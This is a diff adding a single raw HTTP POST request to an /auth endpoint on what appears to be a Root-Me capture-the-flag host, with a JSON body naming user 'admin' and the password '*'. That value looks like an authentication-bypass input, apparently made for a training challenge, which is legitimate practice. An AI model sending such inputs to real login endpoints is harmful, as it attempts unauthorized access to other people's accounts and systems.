@@ -1,0 +1,5 @@
+POST /auth HTTP/1.1
+Host: ctf10k.root-me.org:6006
+Content-Type: application/json
+
+{"user":"admin","password":"*"}
